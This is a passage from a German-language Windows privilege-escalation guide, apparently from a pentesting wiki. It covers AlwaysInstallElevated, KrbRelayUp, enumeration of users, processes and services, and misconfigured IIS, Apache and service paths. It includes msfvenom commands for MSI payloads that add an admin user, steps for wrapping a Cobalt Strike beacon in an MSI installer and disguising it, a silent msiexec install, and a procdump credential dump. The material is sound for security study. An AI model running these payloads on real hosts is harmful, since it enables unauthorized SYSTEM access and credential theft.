Überprüfen Sie die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die ACL des weitergeleiteten Identitätsobjekts sowie die Authentifizierungs- und Identitätswechselebenen der ausgewählten COM-Klasse. Anmeldetyp und Anmeldeinformationskontext des Aufrufers sind relevant: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachten Sie eine freizügige Richtlinie oder eine passende ACL als Prüfhinweis; passive Enumeration sollte weder COM-Coercion noch Relay-Authentifizierung oder Verzeichnisschreibvorgänge auslösen. Ein Shadow Credential für ein Computerkonto kann zu einem Maschinenticket führen und – nur wenn dieses Konto über die erforderlichen Replikationsrechte im Verzeichnis verfügt – einen separaten DCSync-Pfad eröffnen.

Finden Sie den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs finden Sie unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer beliebiger Berechtigungsstufe `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn du über eine Meterpreter-Session verfügst, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` von PowerUp, um im aktuellen Verzeichnis eine Windows-MSI-Datei zur Rechteausweitung zu erstellen. Dieses Script schreibt einen vorkompilierten MSI-Installer, der zur Eingabe einer Benutzer-/Gruppenhinzufügung auffordert (du benötigst also GUI-Zugriff):

```
Write-UserAddMSI
```

Führe einfach die erstellte Binärdatei aus, um die Privilegien zu erweitern.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mit diesem Tool einen MSI Wrapper erstellst. Beachte, dass du eine „**.bat**“-Datei verpacken kannst, wenn du **nur** **Befehlszeilen ausführen** möchtest.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- Erstelle mit Cobalt Strike oder Metasploit einen **neuen Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`.
- Öffne **Visual Studio**, wähle **Create a new project** aus und gib „installer“ in das Suchfeld ein. Wähle das Projekt **Setup Wizard** aus und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende **`C:\privesc`** als Speicherort, wähle **place solution and project in the same directory** aus und klicke auf **Create**.
- Klicke auf **Next**, bis du Schritt 3 von 4 erreichst (Dateien zum Einbinden auswählen). Klicke auf **Add** und wähle den gerade erstellten Beacon-Payload aus. Klicke anschließend auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere in den **Properties** den Wert von **TargetPlatform** von **x86** zu **x64**.
  - Es gibt weitere Eigenschaften, die du ändern kannst, etwa **Author** und **Manufacturer**. Dadurch kann die installierte App legitimer wirken.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions** aus.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action** aus.
- Doppelklicke auf **Application Folder**, wähle die Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass der Beacon-Payload ausgeführt wird, sobald das Installationsprogramm gestartet wird.
- Ändere unter **Custom Action Properties** den Wert von **Run64Bit** zu **True**.
- Erstelle schließlich den Build.
  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI-Installation

So führst du die **Installation** der schädlichen `.msi`-Datei im **Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Um diese Schwachstelle auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du ihnen Beachtung schenken.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Logs gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administratorkennwörter** und stellt sicher, dass jedes Kennwort auf in eine Domäne eingebundenen Computern **einzigartig, zufällig und regelmäßig aktualisiert** ist. Diese Kennwörter werden sicher in Active Directory gespeichert und können nur von Benutzern mit ausreichenden Berechtigungen über ACLs abgerufen werden, sodass diese bei entsprechender Autorisierung die lokalen Administratorkennwörter einsehen können.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Klartextkennwörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, ihren Speicher **auszulesen** oder Code einzuschleusen und so das System besser zu schützen.\
[**Weitere Informationen zu LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie pass-the-hash attacks schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldedaten

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden in der Regel Domänenanmeldedaten für den Benutzer eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldedaten**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn du einer **privilegierten Gruppe angehörst, kannst du möglicherweise eine Privilege Escalation durchführen**. Hier erfährst du mehr über privilegierte Gruppen und wie du sie für eine Privilege Escalation missbrauchen kannst:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Auf der folgenden Seite erfährst du mehr über **interessante Tokens** und wie du sie missbrauchen kannst:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Passwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Prüfen Sie beim Auflisten der Prozesse zunächst, **ob Passwörter in der Befehlszeile des Prozesses stehen**.\
Prüfen Sie, ob Sie **eine laufende Binärdatei überschreiben** oder Schreibberechtigungen für den Ordner der Binärdatei haben, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) laufen, da du sie missbrauchen könntest, um deine Privilegien zu erhöhen.

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer einzelnen passiven Portaufnahme nicht zu sehen ist, beweist daher nicht, dass er nie erreichbar war. Ordne jeden beobachteten Listener seiner PID, dem Prozessbesitzer und der Möglichkeit des Benutzers mit niedrigeren Privilegien zu, ihn zu erreichen, zu. Der Anwendungsname oder ein Debug-Flag allein belegt keine Codeausführung über Benutzergrenzen hinweg. Halte die routinemäßige Enumeration passiv und sende keine Debugger-Befehle.

**Berechtigungen der Binärdateien von Prozessen prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Überprüfen der Berechtigungen der Ordner, in denen sich die Prozess-Binärdateien befinden (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Prüfe bei einer geplanten Aufgabe oder einem Dienst, der Snort unter einem anderen Konto ausführt, genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, sollte der Pfad daraufhin überprüft werden, ob es zu code execution kommen kann, wenn diese Aufgabe oder dieser Dienst beim nächsten Laden Module lädt. Überprüfe die effektiven Berechtigungen des Run-as-Kontos, die aktive Konfiguration, die Modulkompatibilität sowie mögliche Deny- oder Freigabebeschränkungen; ein beschreibbares Verzeichnis allein belegt keine Rechteausweitung. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem Dokumentenstammverzeichnis

Vergleiche bei einer Windows-Apache-Installation den ausführbaren Pfad des Dienstes und das Run-as-Konto mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem herkömmlichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des darin konfigurierten Dokumentenstammverzeichnisses, häufig `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen Dateien in diesem Verzeichnis erstellen kann, während Apache als `LocalSystem` läuft, kann serverseitige code execution die Berechtigungsgrenze des Hosts überschreiten. Stelle sicher, dass der Dienst läuft, genau dieser Pfad bereitgestellt wird und ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Stammverzeichnis allein belegt nur, dass Dateien erstellt werden können. Prüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation verweist der Dienst möglicherweise auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`), wobei sich die Konfiguration daneben unter `conf\httpd.conf` und das Standard-Root unter `C:\wamp64\www` oder `C:\wamp\www` befindet. Prüfe gemeinsam das genaue Dienst-Image, die Ausführungsidentität, das effektive `DocumentRoot` (einschließlich der Erweiterung von `${INSTALL_DIR}` und Überschreibungen durch virtuelle Hosts) sowie die ACL des Roots. Ein beschreibbares WAMP-Verzeichnis belegt weder, dass Apache als `SYSTEM` läuft, noch, dass es die bereitgestellte Datei ausführt. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Root und Netzwerkidentität des Anwendungspools

Ordne bei IIS ein beschreibbares physisches Verzeichnis in `applicationHost.config` einer **aktiven Website/Anwendung** zu und ermittle anschließend den dafür konfigurierten Pool und den serverseitigen Handler. In einem bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfe vor der Annahme, dass ein beschreibbares Verzeichnis Codeausführung ermöglicht, die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Website, den Handler und pfadspezifische Überschreibungen.

Die dynamische ASP.NET-Kompilierung bietet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig ist dies ein Verzeichnis namens `Temporary ASP.NET Files` unterhalb der betreffenden .NET Framework-Installation, aber `<compilation tempDirectory>` der Anwendung kann den Speicherort ändern. [Microsoft dokumentiert den Speicherort und anwendungsspezifische Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse zu isolieren, wenn Anwendungspools einander nicht vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Wenn ein Token mit geringeren Berechtigungen generierten Quellcode im Cache einer **bestimmten** Anwendung ändern kann, ermittle, ob diese Anwendung den Code unter einer privilegierteren [Worker-Prozess-Identität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) neu kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Gleiche den Cache mit der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer möglichen Neukompilierung ab. Prüfe Metadaten schreibgeschützt; löse während der Erfassung keine Kompilierung aus und ändere keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen üblicherweise als **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen hat. `LocalSystem` verfügt lokal bereits über hohe Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` verwendet normalerweise anonyme Netzwerk-Anmeldeinformationen. Ein Pool vom Typ `SpecificUser` verwendet stattdessen das dafür konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität von Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Standardwerte des Pools übernehmen, die sich zwischen IIS-Versionen unterscheiden. Ermittle daher die effektive Konfiguration, statt aus dem Poolnamen zu raten. Wenn Codeausführung einen Pool mit der Netzwerkidentität eines Computerkontos erreicht, prüfe die Verzeichnisberechtigungen **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänen-Namenskontext; ein Ticket für ein Computerkonto oder die Hostrolle allein belegt diese Rechte nicht. Bei einer passiven Erfassung sollten Konfiguration und ACLs geprüft werden, ohne eine Datei hochzuladen, eine Netzwerkauthentifizierung durchzuführen oder Tickets anzufordern.

Bei einem auslesbaren ASP.NET-Handler, der einen Hilfsprozess startet, solltest du jeden anfragegesteuerten Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung verfolgen. Ein Handler, der ein dekodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann Shell-Metazeichen zulassen, die den Befehl verändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stelle fest, dass ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann, und ermittle anschließend die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des Kindprozesses. Eine auslesbare Quellcodezeile, ein Localhost-Listener oder eine Schwäche im Tokenformat allein belegt keine privilegierte Befehlsausführung. Prüfe Quellcode und Poolkonfiguration, ohne während einer passiven Erfassung gefälschte Anfragen zu senden oder den Hilfsprozess auszuführen.

Bei einem PHP-Dienst unter Windows kann ein anfragegesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine PHP-Datei auswerten, die ein Benutzer mit geringeren Berechtigungen ändern kann, und zwar mit der Identität des Workers. Bestätige, dass die Anfrage diese Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Berechtigungen ändern und der Worker lesen kann, geltende PHP-Pfadbeschränkungen das Einbinden erlauben und der Worker tatsächlich mit höheren Berechtigungen läuft. Ein Loopback-Listener oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfe Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während einer passiven Erfassung aufzurufen.

### Passwörter aus dem Arbeitsspeicher auslesen

Mit **procdump** aus Sysinternals kannst du einen Speicherdump eines laufenden Prozesses erstellen. Dienste wie FTP haben **Anmeldeinformationen im Klartext im Arbeitsspeicher**. Versuche, den Speicher auszulesen und die Anmeldeinformationen zu finden.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Als SYSTEM ausgeführte Anwendungen ermöglichen es möglicherweise einem Benutzer, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen und auf „Klicken, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem Drop-Verzeichnis öffnet, in das ein Benutzer mit geringeren Rechten schreiben kann, überschreitet beim Import unter dem Konto des Importers eine Eingabevertrauensgrenze. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder die Aufgabe, die ihn öffnet, dessen effektive Identität und den Parser-Build. Bei einem [historischen Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) waren XML External Entities in Projektmetadaten möglich; eine Netzwerk-Entity unter Windows konnte eine Authentifizierung über das Konto des Importers auslösen, wenn die [Richtlinien für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zulassen. Das ist ein Ansatzpunkt für die Offenlegung von Zugangsdaten, aber kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie bei der passiven Enumeration kein manipuliertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) am Service Control Manager (SCM)-Objekt ist von den Rechten für einen bestehenden Dienst getrennt. Eine erfolgreiche schreibgeschützte [`OpenSCManager`-Zugriffsanfrage](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Ansatzpunkt für eine Prüfung, aber kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das die bei der Erstellung angeforderten Dienstzugriffsrechte besitzt; wird der Dienst später erneut geöffnet, erfolgt eine separate Zugriffsprüfung, die fehlschlagen kann, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfen Sie separat das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Startkonfiguration und den ausführbaren Pfad. Erstellen oder starten Sie bei der passiven Enumeration keinen Dienst.

Korrelieren Sie bei einem Remote-Dienstinstallationspfad diese SCM-Rechte mit einer Freigabe auf dem Ziel, auf die **dieselbe Netzwerkanmeldung** schreibend zugreifen kann, deren zugrunde liegender NTFS-ACL und einem lokalen ausführbaren Pfad, den das Dienstkonto ausführen kann. Ein Nicht-Administratorkonto kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und ein Pfad zum Ablegen der Datei vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Erstellungsrecht für Dienste im SCM allein belegt nicht, dass der neue Dienst mit einer höheren Identität gestartet werden kann.

Ein bestehender Dienst kann beim Start, Herunterfahren oder einem anderen Lebenszyklusereignis eine Hilfsdatei aufrufen, selbst wenn diese in seinem `ImagePath` nicht angegeben ist. Wird der Name der Hilfsdatei in ein Verzeichnis aufgelöst, in das ein Benutzer mit geringeren Rechten schreiben kann, und läuft der Dienst mit einer höheren Identität, kann eine fehlende Hilfsdatei unter bestimmten Bedingungen ersetzt werden. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf der Hilfsdatei**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Berechtigungen zum Erstellen von Dateien im Verzeichnis, die Dienstidentität und einen verfügbaren Auslöser für den Lebenszyklus. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; starten oder beenden Sie den Dienst bei der passiven Prüfung nicht.

Für einen bestehenden Dienst erlaubt [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) zu unterscheiden. Prüfen Sie den Dienstcode oder die dokumentierte Schnittstelle, bevor Sie das Startrecht als mehr als ein Steuerungsrecht einstufen. Falls der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad verwendet, prüfen Sie die Dienstidentität, den genauen Ablauf vom Argument bis zum Schreibvorgang, Pfadbeschränkungen und die Berechtigungen für die **erstellte Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn ein separater privilegierter Prozess oder Loader diese Datei verarbeitet; ein beschreibbares Protokoll oder ein Startrecht allein reicht nicht aus. Erstellen Sie bei einer passiven Bestandsaufnahme keine Testdatei und starten Sie den Dienst nicht.

Bei einem NSClient++-Überwachungsagenten ist eine lesbare `nsclient.ini` ein **Hinweis für eine Konfigurationsprüfung**: Sie kann Web-Zugangsdaten enthalten, während `boot.ini` die Konfiguration an einen anderen Speicherort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Für eine privilegierte Ausführung sind zusätzlich `CheckExternalScripts` (oder ein anderer aktivierter Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und ein Auslöser erforderlich, der ihn unter der Dienstidentität ausführt. Ein Listener, der nur an Loopback gebunden ist, kann für einen lokalen Benutzer dennoch erreichbar sein, aber der Dateipfad, das Passwort oder der Listener allein belegen diese Rechte nicht. Prüfen Sie Metadaten und Berechtigungen, ohne Geheimnisse anzuzeigen oder bei der passiven Enumeration die Web-API aufzurufen. Siehe [NSClient++-Dateiaufbau](https://nsclient.org/docs/concepts/file-layout/), [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` auf `nssm.exe` verweist, prüfen Sie das tatsächliche Ausführungskonto des Dienstes und dessen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert dort die untergeordnete Anwendung](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis angibt. Prüfen Sie die ausführbare Datei des untergeordneten Prozesses und die ACLs des übergeordneten Verzeichnisses, bevor Sie die Berechtigungen des Wrappers als die gesamte Dienstgrenze betrachten. Ein lokaler WCF- oder SOAP-Endpunkt, den dieser untergeordnete Prozess bereitstellt, ist ein separater Ansatzpunkt für eine Prüfung: Bestätigen Sie, dass der Benutzer mit geringeren Rechten den Listener erreichen kann, dass die konkrete Operation seine Eingabe akzeptiert und dass der untergeordnete Dienstprozess den unsicheren Vorgang unter einer höheren Identität ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweisen keine Rechteausweitung; rufen Sie bei der passiven Enumeration keine Dienstoperationen auf.

Verfolgen Sie bei einer benutzerdefinierten WCF-Operation eine vom Aufrufer kontrollierte Zeichenfolge bis in eine PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Eine [`netTcpBinding` mit Windows-Transportanmeldedaten](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client, doch die Berechtigung zum Aufrufen genau dieser Operation und die effektive Identität der Runspace müssen separat geprüft werden. Ein Pfad von der Eingabe eines Aufrufers mit geringeren Rechten zu `AddScript` unter einer höheren Dienstidentität ist eine Codeausführungsgrenze; ein offener Port, ein authentifizierter Client oder eine nicht verwendete Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Impersonation-Einstellungen statisch, ohne den Endpunkt bei der Enumeration aufzurufen.

Service Triggers ermöglichen es Windows, einen Dienst beim Eintreten bestimmter Bedingungen zu starten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Auch ohne `SERVICE_START`-Rechte können Sie privilegierte Dienste häufig durch Auslösen ihrer Trigger starten. Techniken zur Enumeration und Aktivierung finden Sie hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual-Studio-Dienst für Diagnosesammlungen

Visual-Studio-Installationen mit C/C++-Tools enthalten möglicherweise `VSStandardCollectorService150`, einen Diagnosedienst, der für die Ausführung als `LocalSystem` konfiguriert ist. Bei [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wurde eine Junction und ein Race über einen Object-Manager-Link verwendet, um eine Zurücksetzung der Dienst-DACL umzuleiten. Für die demonstrierte Rechteausweitung war außerdem ein nutzbarer MSI-Reparaturpfad des Visual-Studio-Setup-WMI-Providers sowie dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` erforderlich. Die Komponente wurde im Januar 2024 behoben.

Prüfen Sie bei einer passiven Triage das Konto und den Binärpfad dieses Dienstes, ob der Pfad zum Setup-WMI-Compiler vorhanden ist und den Patch-Status der installierten Komponente. Ein Diensteintrag, die Visual-Studio-Produktversion oder die Compilerdatei allein belegen nicht, dass der Host verwundbar ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Rufen Sie eine Liste der Dienste ab:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Du kannst **sc** verwenden, um Informationen zu einem Dienst abzurufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
